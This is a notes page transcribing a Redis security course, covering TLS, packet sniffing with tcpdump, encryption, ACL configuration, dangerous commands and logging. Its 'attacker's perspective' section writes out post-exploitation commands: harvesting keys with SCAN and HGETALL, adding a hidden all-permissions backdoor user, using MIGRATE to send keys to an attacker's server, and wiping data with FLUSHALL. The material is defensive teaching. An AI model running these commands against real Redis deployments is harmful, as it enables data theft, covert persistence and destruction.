### On Security (cont.)


### Prologue 
This article is created from transscript of [RU330](https://redis.io/university/courses/ru330/) verbatim, not because of my laziness. But for the great significance and unstirrable value in the aforementioned narrative of the course. Nevertheless links and addenda will be appended whenever it is appropriate.


### I. [Introduction to TLS](https://youtu.be/tkfOV_zl08I)
We're now going to start learning about transport layer security, or TLS as it's commonly known. TLS is a series of protocols that secure communication across a network. For example, the connection between your web browser and the server it's connecting to is almost always secured using TLS. In Redis 6, you use TLS to secure network communications to Redis. 

**TRANSPORT LAYER SECURITY**
- Protocols that secure network communication 
- Built into Redis 6

So what exactly does TLS do? If you take a moment to consider what's required to have a private conversation over a network, you can break it down into three requirements --  

- PRIVACY
- AUTHENTICATION
- INTEGRITY

First, you need to know that your communication is private. That is no one should be able to read the messages you're sending back and forth across the network. 

Second, you need to be able to reliably identify the person or entity you're communicating with. For example, if you're trying to connect to your bank, then you need to know that the website you're connecting to is indeed run by your bank and not by some criminal pretending to be your bank. That's the authentication or identity requirement. 

Finally, you also want to know that the messages being sent back and forth between, say, you and your bank have not been corrupted or tampered with in any way. There can't be a *man in the middle* altering those messages. This is the integrity requirement. 

**TLS ALLOWS YOU TO ACHIEVE**
- Privacy 
- Identity 
- Integrity 

TLS solves all these problems, plus a few more. And the primary tools it uses to achieve this are encryption and public key infrastructure. Those two ideas may not mean much to you now. But we're going to explore them in the next few units, just before we learn exactly how to configure TLS in Redis. 

**HOW TLS SECURES CONNECTIONS**
- Encryption 
- Public key infrastructure 

If you understand encryption, even on a basic level, then you have a much better idea of what you're doing when you're configuring TLS in your own Redis deployments. 


### II. [Redis Horror Story #3](https://youtu.be/foOn3sED2EM)
Before we get into the meat of this unit, let's do one final horror story. We've talked a lot about how to secure Redis processes and Redis users. But what about the network connections themselves? In this final horror story, I want to talk about packet sniffing or packet capture. 

- Packet sniffing can be used to intercept unencrypted traffic.
- Easy to view unencrypted traffic on the network 
- TLS helps prevent packet sniffing exploits 

Packet sniffing is the act of recording the individual segments of data traveling over a network. And it's commonly used to analyze networks. The upshot is that it's pretty easy to record and view unencrypted network traffic. And that includes the traffic between your applications and your database. And if an attacker is sniffing your unencrypted network traffic, well, that can easily turn into the kind of horror stories we want to avoid. 

So let's quickly see just how easy it is to view unencrypted traffic on a network connection and how to prevent that with TLS. Here, you can see I have two terminal windows open, one is my Redis client and the other is Redis server. I'm here on the server now. I'll start my server in the least secure way I know, for demonstration purposes, obviously, without a configuration file and just with the defaults. 
```
redis-server 2>&1 > redis.out & 
```

Next, I'll disable protected mode from the command line so that we can make a remote connection. 
```
redis-cli 
config set protected-mode no 
exit
```

Finally, I'll launch `tcpdump`. `tcpdump` allows me to inspect all of the traffic running between my Redis client and the Redis server. 
```
tcpdump port 6379 
```

Now, let's switch back to our client terminal window. I'll connect to the server I've just started using the Redis CLI. Now that I'm connected, I'll write some sensitive data to Redis.
```
redis-cli -h ru330.redis 
hset user:1:secret gender m birthdate 19790101 ccn 5270426764505555 ccn_expire 1224 
```

Here, I'm entering a gender, birthday, credit card number, and credit card expiration date. Now, let's look at the output of the `tcpdump` command. If you look closely, you'll see everything I just sent to Redis, including all of the sensitive data is there. 

![alt tcp dump output](img/tcpdump-output.png)

In this example, I'm sniffing unencrypted data from the server where Redis is hosted. But this kind of surveillance can be run on any server, network switch, or router that sits between your Redis client and your Redis server. This means that usually there are quite a few opportunities for someone to sniff and record unencrypted network traffic. 

Running a `traceroute` from your client to your Redis server will give you an idea of just how many sniffing opportunities might exist. And you can't secure this network route because it's completely outside of your control. 
```
traceroute ru330.redis.cloud 
```

So let's see what happens if we encrypt our network traffic using TLS instead. I'm going to start Redis again, this time with TLS enabled. Now I'll clear my screen and start that `tcpdump` again. Moving back to my client screen, I'll now connect to Redis, this time using TLS. 
```
redis-cli -h ru330.redis --tls --cacert ca.crt 
```

This means my connection is now encrypted. Now I'll issue the same command I did before. Then, let's look again at the `tcpdump` output. See the difference? All you can see now are what appear to be a bunch of random characters. This is the value of encryption in action. Encryption protects your sensitive data from prying eyes on the network. 

For the rest of the unit, I'm going to explain how TLS works and everything you need to know to set it up with Redis. But first, two key points to remember for now. 

- First, if you're storing sensitive information in Redis, and most personal information is sensitive, then you should encrypt your Redis connections with TLS. 
- Second, even if you're using TLS, avoid public networks if you can. If you're on a private network, you greatly limit the number of attack vectors. OK. So with that out of the way, let's learn about TLS and how to use it with Redis.

**Addendum**

Life in Windows is no better than that in Linux for there is no such things as `tcpdump` bundled with. However, one can install [WinShark](https://www.wireshark.org/#homeMemberLink) which requires [Npcap](https://npcap.com/) to work together. 

![alt winshark](img/winshark-1.JPG) 

Typically, redis client uses [RESP](https://redis.io/docs/latest/develop/reference/protocol-spec/) protocol, which is plain text, to communicate with redis server. As you can see in following screens. 

![alt ](img/unsafe-1.JPG)

![alt ](img/unsafe-1.JPG)

All commands sent as well as results received can be cleally seen. 


### III. [Encryption](https://youtu.be/ULlTtFlSmkY)
Encryption is the process of taking a message
and encoding it so that only the intended recipients can
read it.
The algorithm you use to encrypt a message is called a cipher.
Most of us are familiar with basic substitution ciphers
such as ROT13.
In ROT13, you can encrypt text by substituting or rotating
each letter in a message with the letter that
appears 13 letters later in the Latin alphabet.
So for example, suppose we start with the plain-text message
"HELLO".
If we encrypt "HELLO" using ROT13,
we get the cipher text URYYB.
Shifting the H 13 letters forward gets us U and so on.
To decrypt the cipher text, we just
perform the reverse operation.
Take a moment to see if you can decrypt
the ROT13 encoded message you see on the screen now.
Of course, the ciphers used by TLS
are much more sophisticated than ROT13.
TLS relies on two types of ciphers, symmetric key ciphers
and asymmetric key ciphers.
Now when I say key here, I'm talking about an encryption
key.
An encryption key is a little bit like a password,
but it's generally much longer than a password
and not really easy for a human to memorize.
Ciphers use encryption keys to encrypt and decrypt data.
In symmetric key cryptography, the same key
is used for both encryption and decryption.
In asymmetric key cryptography, one key is used for encryption,
and a different key is used for decryption.
Let's look at some examples to see how this works.
If you've ever encrypted a file, you've probably
used a symmetric key cipher.
Here I'm using the gpg command line utility to encrypt a file
called treasure-map.txt.
Here I'm specifying that I want symmetric encryption,
that I want to use the AES256 cipher,
which is a commonly used symmetric key cipher,
that the output should be written to a file called
treasure-map.encrypted, and that the file I want to encrypt is
called treasure-map.txt.
When I run this command, the program asks me for a password.
Now this is important. gpg uses the password
I enter to generate an encryption key,
and then it uses that encryption key to encrypt the file.
So now we can see the encrypted file.
To decrypt the file, I run gpg's decrypt command,
providing the password that I use to encrypt the file.
Again, gpg then uses that password
to generate the key that will successfully decrypt the file.
Clearly, you need to keep the password and encryption
keys secret if you want your encrypted file to remain
secret.
Now suppose it's my friend, Captain Long
Beard, who wants to send me the encrypted treasure map.
If I want to receive this encrypted map,
then I also need to receive the password or key that
was used to encrypt it, but of course, I run into a problem
here.
How is that Captain securely share the key with me?
He needs to be very careful when sharing his secret key
because if it gets into anyone else's hands,
then they'll be able to decrypt the map.
That's where asymmetric key encryption comes in.
As I mentioned, asymmetric key ciphers
use two keys, one to encrypt and another to decrypt.
The key to encrypt is called the public key,
and the key to decrypt is called the private key.
Do you see why?
You can share your public key far and wide,
and it doesn't matter who gets access to it.
Public keys are meant to be publicly distributed.
I can safely share my public key in an email,
a tweet, or a published blog post.
Once Captain Long Beard has my public key,
he can use it to encrypt messages for me.
To decrypt those messages, I need to use my private key.
Obviously, then, I need to keep my private key secret.
We're going to use the openssl command line
utility to see how asymmetric encryption works in action.
First, I'm going to generate my private key,
so I run the openssl genrsa command.
This creates the file that I'll use as my private key.
Remember that this file can't be shared with anyone.
Here's what the contents of the file look like.
Now, an interesting fact is that the private key file actually
contains the public key, but we need to extract it.
So here's the command to do that,
and here's what the public key actually looks like.
So now I just need to send my public key to the Captain.
It doesn't matter how I send it because it's only used
for encryption, not decryption.
I can send it over email, or I can paint it on a billboard.
Now Captain Long Beard can use my public key
to encrypt the file containing the treasure map.
This is the openssl command he'll run.
He then sends me the encrypted file, treasure-text.encrypted.
Once I get the file, I use my private key to decrypt it.
Here's the openssl command I'll run.
If I'm using the correct private key,
then I'll be able to decrypt the cipher text into the plain text
message that leads me to the treasure.
OK. So there's another important difference
between asymmetric key and symmetric key ciphers,
which is performance.
Asymmetric key ciphers are much more computationally expensive
and often thousands of times slower
than symmetric key ciphers, so if you
need to encrypt a lot of data, you should actually
use a symmetric key cipher.
And TLS actually uses both.
TLS uses asymmetric key cryptography
to help the two parties establish a shared secret key,
and then TLS switches to symmetric key cryptography
for all subsequent exchange of data.
Let me elaborate on that just a bit.
Here's how a TLS connection to your bank
works on a very rudimentary level.
Step one, you connect to your bank's website.
Step two, your bank sends you its public key.
Step three, you use the bank's public key to encrypt and send
a large random number.
Step four, the bank decrypts the number with its private key.
Now you and your bank both have this secret, random number.
Step five, you and your bank independently
use this secret random number to generate an encryption key
that you'll use with symmetric cryptography.
Step six, communication then switches
to using a symmetric key cipher.
You and your bank then encrypt and decrypt
all subsequent communication using the same encryption
key you both just independently generated.
We've just covered a lot of material,
and you may need to re-watch this video to really master it.
But at this point, you should have
a sense for what encryption is and how it ensures
the privacy of a conversation.
In the next units, we'll see how TLS solves the problems
of authenticity and integrity.


### III. [Practical ACLs with Redis](https://youtu.be/Va95q2SXGPA)
Onscreen, you can see three ACL commands.

FALCO
```
acl setuser falco on >butterscotch +@all -@dangerous -@admin +acl|whoami allkeys 
```

RICK
```
acl setuser rick on >pickle +@admin 
```

CACHESERVICE 
```
acl setuser cacheservice on >cacheme +set +get ~cache:*
```

By the end of this unit, you'll understand what these commands are doing and how you might use them as part of a database caching service. 

We've specified three users here: `Falco`, who's our software developer, `Rick`, our administrator, and `cacheservice`, which is for the application itself. We'll see what these commands do in a moment. 

But first, before we do anything, we need to disable the default user and set an admin user. The default user exists in every Redis deployment and has full permissions. Here's the command to disable the default user. 
```
acl setuser default off
```

Remember, always disable the default user when you're not using ACLs, but only after you add the administrative user of your own. *You should only use the default user when it's required for backwards compatibility with Redis 5 or below*. 

So now, let's look at `Falco`. 
```
acl setuser falco on >butterscotch allcommands -@dngerous -@admin +acl|whoami allkeys 
```

`Falco` is our development user. She needs database access to create and test her applications. We start with the ACL [SETUSER](https://redis.io/docs/latest/commands/acl-setuser/) command, followed by the user name, which in this case is `Falco`. We next specify "on" to indicate that the user can log in. After that, we specify the user's password: butterscotch. The greater than sign here indicates that this is a password. Next, we'll specify three rules that give `Falco` access to the full suite of Redis commands, except those that are in the dangerous category. *By default, ACL users have no permissions*. So we start by giving `Falco` permission for all commands, using the allcommands flag here. We then subtract the dangerous commands with the -@dangerous rule. We next explicitly grant access to the ACL WHOAMI command with the plus ACL pipe whoami. And finally, we specify allkeys, which allows `Falco` to access any key in the database. If we authenticate as `Falco`, you'll see that she has access to the ACL WHOAMI command, but not the ACL LIST command. `Falco` also can't run the KEYS command, because this is in the dangerous command category. And `Falco` can't run the CONFIG command, because this is an admin command. `Falco` can, however, SET and GET the key foo and run any other data structure commands. So `Falco` can do her job as a developer. Notice that in configuring `Falco`, we followed the principle of least privilege. She has access to the exact commands she needs and none that she doesn't. 

You might be wondering what commands the Redis ACL system considers dangerous. To check this or any ACL category rule, run the `ACL CAT` command. For example, here we'll run `ACL CAT DANGEROUS`. You'll see a list of commands that include KEYS and FLUSHDB to take a couple of examples. To see a list of all command categories, run `ACL CAT` with no arguments like this. 
```
> ACL CAT
1) "keyspace"
2) "read"
3) "write"
4) "set"
5) "sortedset"
6) "list"
7) "hash"
8) "string"
9) "bitmap"
10) "hyperloglog"
11) "geo"
12) "stream"
13) "pubsub"
14) "admin"
15) "fast"
16) "slow"
17) "blocking"
18) "dangerous"
19) "connection"
20) "transaction"
21) "scripting"
```

OK, so now let's configure our admin user, Rick. 
```
acl setuser rick on >pickle +@admin 
```

In this case, the ACL settings are pretty simple. We set our user, Rick, to on so that he can log in. We set his password to pickle, as indicated by the greater than sign. And finally, we specify +@admin, which gives Rick access to the admin commands. Now, let's log in as Rick. You can see, unlike `Falco`, Rick can run the CONFIG command to see how this Redis instance is configured. Rick can also run the ACL LIST command to see the users for this Redis database. Here again is the principle of least privilege. Rick's primary duty is to administer Redis. This includes adding users, using the ACL command, configuring Redis, and setting up the deployment model. It may also include helping to troubleshoot issues. Rick only has the access needed to do his job, to perform administrative functions. 

Our last user is for the application itself. It's also important to create specific users for your applications and to apply privileges accordingly. 
```
acl setuser cacheservice on >cacheme +set +get ~cache:*
```

Here, we create the cacheservice user. We set the user to on. Then, we provide a password. Now comes the permissions. The cache service can run two commands, SET and GET. We indicate that with the +SET and +GET rules, we also limit the queues that the cache service can touch. The rule ~cache:* restricts this user to the keys beginning with cache: . 

Let's log in as the cache service. If we try to set the key, `data:123`, we get a NOPERM error, saying that we don't have access to the given key. That's because we're limited to certain keys in the Redis key space. Let's try again with the key, `cache:123` In this case, the command succeeds. We also get the same key. Notice that we can't run any other commands as the cache user. If we do, we'll get a no permissions error. 

You should now have a basic idea about how to create users and ACLs. And you're probably already thinking about how you might assign your own administrative users, developers, and service accounts their respective ACLs. To learn more about Redis ACLs and get all of the details on the ACL rule syntax, we encourage you to check the Redis docs. 

> Before deployment, disable the default user and set an admin user. The default user exists in every Redis deployment and has full permissions, which is considered dangerous as an attacker will expect its presence as a way to access your data.


### IV. [Administering Redis ACLs](https://youtu.be/Q1rPFw6Iz64)
The best way to manage ACL users in Redis is to specify them in an ACL configuration file. If you have just a few users, you can configure them directly in the Redis conf config file. 
```
# Redis ACL users are defined in the following format:
#
#   user <username> ... acl rules ...
#
# For example:
#
#   user worker +@list +@connection ~jobs:* on >ffa9203c493aa99
#
# The special username "default" is used for new connections. If this user
# has the "nopass" rule, then new connections will be immediately authenticated
# as the "default" user without the need of any password provided via the
# AUTH command. Otherwise if the "default" user is not flagged with "nopass"
# the connections will start in not authenticated state, and will require
# AUTH (or the HELLO command AUTH option) in order to be authenticated and
# start to work.
```

But for more complex ACL setups, you can and should write them to a separate configuration file.

> Use an external Redis ACL file to manage ACLs

```
# Using an external ACL file
#
# Instead of configuring users here in this file, it is possible to use
# a stand-alone file just listing users. The two methods cannot be mixed:
# if you configure users here and at the same time you activate the external
# ACL file, the server will refuse to start.
#
# The format of the external ACL user file is exactly the same as the
# format that is used inside redis.conf to describe users.
#
# aclfile /etc/redis/users.acl
```

or 
```
# Included paths may contain wildcards. All files matching the wildcards will
# be included in alphabetical order.
# Note that if an include path contains a wildcards but no files match it when
# the server is started, the include statement will be ignored and no error will
# be emitted.  It is safe, therefore, to include wildcard files from empty
# directories.
#
# include /path/to/local.conf
# include /path/to/other.conf
# include /path/to/fragments/*.conf
#
```

In this unit, we're going to show you just how to do that. But before we move on, let me just do a quick shameless plug and say that if you have dozens of users and complex roles to configure, then you might want to check out Redis Enterprise Software or Redis Enterprise Cloud. Both of these products feature role based access control or RBAC for short. And that means that you can define generic roles and then assign those roles to your users. And all of this is done using a user friendly UI. So this will likely be more convenient if you're a bigger organization.

> Redis Enterprise & Redis Enterprise Clould come with role based access control to simplify provisioning ACLs. 

OK, back to our open source Redis. when you're configuring access control lists in a file, you want to start with the `user` directive, followed by the syntax used with the `ACL SETUSER` command. Let's see how we'd store the three users we created in the last unit. We're going to store this configuration in a file called `acl.conf`. We're referencing the file from a `redis.conf` file, as you can see here. So let's now open up `acf.conf`.

First, we disable the default user. 
```
user default off 
```

Next, we specify our three users: Falco, Rick, and cacheservice. 
```
user falco on #80e5b5a554cccea7aad01d910203bb6364d2ae4b4f321cd91841821913a8574a +@all -@dangerous -@admin +acl|whoami allkeys 

user rick on #6d08a4e630e4aa0d5cd873e65aea0a23df42de61073ecb49ef17158fe6a9dcea +@admin 

user cacheservice on #a9c5ed4cb5ff21ddf0d2125554aa94c5ab487803bb27eca081b925cde8473360 +set +get ~cache:*
```

Notice that each user declarative starts with the user directive. You'll also notice a long, encoded string beginning with a pound sign. This is the user's password hashed with the sha256 hash function. *If you're going to store ACL configuration in a file, it's really important never to store the passwordsas plain text*.

So here, we've hashed the passwords. The pound sign tells Redis that these passwords have been hashed with the [sha256](https://computersciencewiki.org/index.php/SHA256) hash algorithm. So how do you hash your passwords? You can run them through the Linux shasum utility like this. 
```
echo -n "pickle" | shasum -a 256
```

Here, I'm getting the shasum for the password: pickle. But it's probably easier to start up a Redis instance, configure your ACLs from the command line, and then call `ACL SAVE` so that Redis will write out the configurations to a file for you. To do this, all you need is a user who has access to the @admin cat command category or permissions the ACL command.

Let's use the command line to add a new user named Claude with the password: blueberry. Next, we'll call `ACL SAVE`. 
```
redis-cli 
AUTH rick pickle 
ACL SETUSER claude on >buleberry +@admin 
ACL SAVE 
EXIT
```

Now, if we open up our acl.conf file, we can see that Redis has written our ACL users alphabetically and in a fully normalized form. 

![alt acl save](img/acl-save.png)

Here's the line with the user we just added. And notice that Redis writes out the hashed password for us. Once we've updated our ACL file locally, we need to get it into our Redis servers. We'll assume that you have a way of syncing configuration files to your production deployment. Once you've done that, issue an `ACL LOAD` command to each Redis server in your deployment. 

![alt load acl](img/load-acl.png)

This will ensure a zero downtime update. Now, let's look at some commands you might run when you're administering ACLs from the Redis CLI.

First, I'll run an `ACL WHOAMI`. This command will show me which user I'm currently logged in as. Here you can see, I'm logged in as Rick. To see a list of all Redis database users, run the `ACL LIST` command. Notice the default user is off and has access to no commands. You'll also see other users we've provisioned. We can also use the `ACL CAT` command to explore command categories. So here are all the categories. And as I said in the last unit, you can also use the ACL CAT command to see which commands each category includes. So here's what's included in the scripting commands category. 
```
ACL CAT scripting 
1) "script|flush"
2) "script|help"
3) "script|debug"
4) "script|load"
5) "script|exists"
6) "script|kill"
7) "eval"
8) "fcall_ro"
9) "function|load"
10) "function|flush"
11) "function|dump"
12) "function|help"
13) "function|delete"
14) "function|kill"
15) "function|restore"
16) "function|list"
17) "function|stats"
18) "fcall"
19) "evalsha"
20) "evalsha_ro
```

OK, finally to delete a user, run the` ACL DELUSER` command. This is the sort of ACL modification you might need to make in production in the event of some kind of emergency. Just be sure that any change you make here also gets written back to your ACL configuration files. 

At this point, you should have all the basic knowledge needed to start using ACLs with your own Redis deployments. There are a few more details in the Redis ACL docs, which you should explore at your leisure. We'll link to those docs in the course handout.

[ACL commands at Redis.io](https://redis.io/commands#server)

[ACL documentation at Redis.io](https://redis.io/topics/acl)

> The best way to manage ACL users in Redis is to specify them in an ACL configuration file. If you have just a few users, you can configure them directly in the redis.conf configuration file. For large and complex ACL setups, you can and should write them to a separate configuration file.

Finally, for complex ACL setups that require role based access control, you should check out Redis Enterprise Cloud or Redis Enterprise Software. These products can really simplify the management of users and rules. OK, end of shameless plug. See you after the security tips.

![alt enterprise acl](img/enterprise-acl.png)

**Addendum**

1. As far as I can test in Redis 7.2.4, `ACL INFO` has to be granted *explictly* with a `+acl|whoami` even though the user already in @admin. 
2. Redis is rather stringent than prudence in determining the category. As you may see in the `SET` command documentation: Time complexity is O(1) but ACL category is @slow. A search for @dangerous command yields 75, @slow command yields 271! 

![alt set command](img/set-command.jpg)


### V. Dangerous Commands
You probably noticed that Redis has an entire ACL category dedicated to dangerous commands.

So what are dangerous commands, and why are they dangerous?

**Dangerous commands include administrative commands and other commands that may negatively affect database performance or render your database unavailable.**

As a general rule, you should avoid running dangerous commands in production.

#### Administrative commands
You should consider most admin commands dangerous, as you want to prevent these commands from being run by an attacker at all costs.

For example, the `CONFIG` command is an administrative command that allows you to modify the Redis configuration at runtime. Changing the configuration could disrupt applications and cause outages. `CONFIG` should only be used in production by those who understand what they are doing and only when absolutely required.

On the other hand, the `LASTSAVE` command is also an admin command and is therefore marked as dangerous. This command gives you the timestamp of the last successful write to disk. It's highly unlikely that this command could be used to damage Redis in any way.

#### Dangerous commands may impact performance
Commands that may significantly impact performance are dangerous. If you're an experienced Redis user, you probably know to avoid the `KEYS` command. The `KEYS` command scans all keys stored in the Redis server and blocks until it completes. This can take anywhere from several seconds to several minutes depending on the number of keys on the server, which means that this command can block other clients for quite some time. For this reason, `KEYS` is considered dangerous.

#### Dangerous commands may impact availability
The final category of dangerous commands may impact the availability of your Redis database. For instance, the `FLUSHDB` and `FLUSHALL` commands will delete all of the data in your database. Likewise, the `SHUTDOWN` command will terminate the Redis process. Obviously, running this command on a production database will affect your applications negatively.


### VI. Redis Logging
Redis comes with two types of logs relevant to security: the ACL log and the Redis server log files.

**The ACL log allows you to see failed authentication attempts and failed access attempts when access to a key or command is blocked by an ACL.**

The ACL log is stored in memory, in Redis itself. By default, the log stores 128 entries, but this is configurable.

#### Using ACL LOG
To demonstrate, let's first create a new user 'john' with access to the key "foo" and the command GET.
```
> ACL SETUSER john on >password +get +acl ~foo*
```

Then we can create two keys: foo and bar.
```
> SET foo bar
> SET bar foo
```

When we authenticate as john, you can see that the user cannot set the key foo because he does not have access to the SET command and can not GET the key bar because he doesn’t have access to that key.
```
> AUTH john password
> SET foo pickle
(error) NOPERM this user has no permissions to run the 'set' command or its subcommand >
GET bar
(error) NOPERM this user has no permissions to access one of the keys used as arguments
```

We can call ACL LOG to view these failed access attempts.
```
> ACL LOG
1)  1) "count"
    2) (integer) 1
    3) "reason"
    4) "key"
    5) "context"
    6) "toplevel"
    7) "object"
    8) "bar"
    9) "username"
   10) "john"
   11) "age-seconds"
   12) "3.8490000000000002"
   13) "client-info"
   14) "id=4 addr=127.0.0.1:36758 fd=8 name= age=46 idle=0 flags=N db=0 sub=0
psub=0 multi=-1 qbuf=22 qbuf-free=32746 obl=0 oll=0 omem=0 events=r cmd=get user=john"
2)  1) "count"
    2) (integer) 1
    3) "reason"
    4) "command"
    5) "context"
    6) "toplevel"
    7) "object"
    8) "set"
    9) "username"
   10) "john"
   11) "age-seconds"
   12) "10.545999999999999"
   13) "client-info"
   14) "id=4 addr=127.0.0.1:36758 fd=8 name= age=39 idle=0 flags=N db=0 sub=0
psub=0 multi=-1 qbuf=34 qbuf-free=32734 obl=0 oll=0 omem=0 events=r cmd=set user=john"
```

The ACL LOG output shows the following:

1. The reason a command was blocked
- This can be seen under "reason". Reasons may be "auth", "command", and "key".
2. The object denied access.
- This may be a command, a key, or the user for whom authentication failed.
3. How long ago the failure occurred
4. The connection information for the client and user who requested the failed command.

The ACL log is especially useful when you're troubleshooting application failures. The log can also help you to identify compromised connections.

You can limit the number of log entries that are shown by appending a number to the ACL LOG. For example, here's how to request the two most recent log entries:
```
> ACL LOG 2
```

Since the ACL log is stored in memory, there are two ways to limit it: resetting the log or setting a maximum length. To clear the log, you can call the ACL LOG RESET command:
```
> ACL LOG RESET
```

To set a maximum length, you can set the acllog-max-len directive in the `redis.conf` file:
```
acllog-max-len 10
```

#### Setting up and using the Redis Log File
The Redis log file is the other important log you need to be aware of. The Redis log file contains useful information for troubleshooting errors configuration and deployment errors. If you don't configure Redis logging, troubleshooting will be *significantly* harder.

Redis has four logging levels, which you can configure directly in `redis.conf` file.

Log Levels:

1. WARNING
2. NOTICE
3. VERBOSE
4. DEBUG

```
# Specify the server verbosity level.
# This can be one of:
# debug (a lot of information, useful for development/testing)
# verbose (many rarely useful info, but not a mess like the debug level)
# notice (moderately verbose, what you want in production probably)
# warning (only very important / critical messages are logged)
# nothing (nothing is logged)
loglevel notice

# Specify the log file name. Also the empty string can be used to force
# Redis to log on the standard output. Note that if you use standard
# output for logging but daemonize, logs will be sent to /dev/null
logfile ""

# To enable logging to the system logger, just set 'syslog-enabled' to yes,
# and optionally update the other syslog parameters to suit your needs.
# syslog-enabled no

# Specify the syslog identity.
# syslog-ident redis

# Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7.
# syslog-facility local0

# To disable the built in crash log, which will possibly produce cleaner core
# dumps when they are needed, uncomment the following:
#
# crash-log-enabled no
```

Redis also supports sending the log files to a remote logging server through the use of syslog.

Remote logging is important to many security professionals. These remote logging servers are frequently used to monitor security events and manage incidents. These centralized log servers perform three common functions: ensure the integrity of your log files, ensure that logs are retained for a specific period of time, and to correlate logs against other system logs to discover potential attacks on your infrastructure.

Let's set up logging on our Redis deployment. First we'll open our `redis.conf` file
```
$ sudo vi /etc/redis/redis.conf
```

The redis.conf file has an entire section dedicated to logging.

First, find the `logfile` directive in the redis.conf file. This will allow you to define the logging directory. For this example lets use `/var/log/redis/redis.log`.

If you'd like to use a remote logging server, then you'll need to uncomment the lines `syslog-enabled`, `syslog-ident` and `syslog-facility`, and ensure that `syslog-enabled` is set to `yes`.

Next, we'll restart the Redis server.

You should see the log events indicating that Redis is starting.
```
$ sudo tail -f /var/log/redis/redis.log
```

And next let's check that we are properly writing to syslog. You should see these same logs.
```
$ less /var/log/syslog | grep redis
```

Finally, you’ll need to send your logs to your remote logging server to ensure your logs will be backed up to this server. To do this, you’ll also have to modify the rsyslog configuration. This configuration varies depending on your remote logging server provider. Check with your administrator or DevOps team for details on this.


### VII. [An Attacker's Perspective](https://youtu.be/NmPv15JJm5Y)
At this point, I'm sure you understand that the majority of Redis exploits are caused by administrators exposing Redis directly to the internet and by not enabling authentication. After all, you've heard our horror stories. 

ACLs are important because they limit attack surface. But to limit attack surface, you need to understand a few post-exploitation techniques. Post-exploitation is what happens when an attacker has gained access to a system. This should get you thinking about exactly what you need to protect against. To do that, let's look at an attacker's perspective. Here's how I'd attack Redis if I were an attacker. 

First, I'd run the `SCAN` command to get a general sense of which keys exist.
If I were a less-adept attacker, I might run the `KEYS` command, which returns every key on the Redis server. The problem with this command is that it might raise alarms. The `KEYS` command blocks until it completes. For this reason, KEYS is considered a dangerous command, so don't ever run it in production yourself. 

I might also run the `MONITOR` command -- another dangerous command. The `MONITOR` command streams every command sent to Redis back to your client. This would allow me to see in real time exactly what's sent to the server. Once I had some key names, I'd run the `TYPE` command. This would show me what commands I could run against the keys that I had access to. For instance, here I have a hash. So I can use the `HGETALL` command to see what's inside. 
```
TYPE secret:users:1
HGETALL secret:users:1
```

Look at all the sensitive data. I've just found someone's personal information. I've hit the jackpot. Before leaving though, I need to add one more thing -- a backdoor user using the ACL `SETUSER` command. 
```
ACL SETUSER applicationuser on >password +@all ~* 
```

This would allow me to log back in later and continue my work. In this case, I've named the user *applicationuser* and given this user all permissions. I'll even persist it to your ACL configuration file. This ambiguous naming might get past any cursory check of the currently allowed users. So this incidentally shows why it's important to regularly review the accounts in your database. This is the approach often used by a *low-and-slow* type of attacker. These attackers are the most dangerous because they're hard to detect. 

Another type of attacker is the destructive one. As a destructive attacker, I do two things. If I thought your data was valuable, I'd use the `MIGRATE` command to send the data to my own Redis server. `MIGRATE` moves the entire key and removes it from its origin database. 
```
MIGRATE remoreredisserver.redis.cloud 7700 "" 0 5000 KEYS secret:users:1 
```

Here, I'm migrating the key secret:users:1 to my own server. I can save these details for a later targeted attack using this user's personal information. 

Now on the other hand, if the data on the system was not valuable to me, I'd just drop the database using the `FLUSHALL` command. Now if I run `KEYS`, the database no longer exists. Pretty scary, huh? That's why access controls like ACLs are so important. You can help stop the bad guys from getting in, and you can stop them from stealing data or destroying your database.

|  |  |  |
| ----------- | ----------- | ----------- |
| [SCAN command](https://redis.io/commands/scan) | [KEYS command](https://redis.io/commands/keys) | [TYPE command](https://redis.io/commands/type) |
| [MONITOR command](https://redis.io/docs/latest/commands/monitor/) | [HGETALL command](https://redis.io/commands/hgetall) | [MIGRATE command](https://redis.io/commands/migrate) |
| [FLUSHALL command](https://redis.io/commands/flushall) | [ACL commands](https://redis.io/docs/latest/commands/?name=ACL) | [ACL GENPASS](https://redis.io/docs/latest/commands/acl-genpass/) |
| [ACL USERS](https://redis.io/docs/latest/commands/acl-users/) | [ACL GETUSER](https://redis.io/docs/latest/commands/acl-getuser/) | [ACL DRYRUN](https://redis.io/docs/latest/commands/acl-dryrun/) |


### VIII. Biblipgraphy 
1. [WinShark](https://www.wireshark.org/#homeMemberLink)
2. [Npcap](https://npcap.com/)
3. 


1. [OVER 18,000 REDIS INSTANCES TARGETED BY FAKE RANSOMWARE](https://duo.com/decipher/over-18000-redis-instances-targeted-by-fake-ransomware)
2. [SHA256 Online Tools](https://emn178.github.io/online-tools/sha256.html)
3. [Redis configuration file example](https://redis.io/docs/latest/operate/oss_and_stack/management/config-file/)
4. [The murder of Roger Ackroyd by Agatha Christie](https://www.gutenberg.org/ebooks/69087)


### Epilogue 
> a man may work towards a certain object, may labour and toil to attain a certain kind of leisure and occupation, and then find that, after all, he yearns for the old busy days, and the old occupations that he thought himself so glad to leave?


### EOF (2024/06/21)
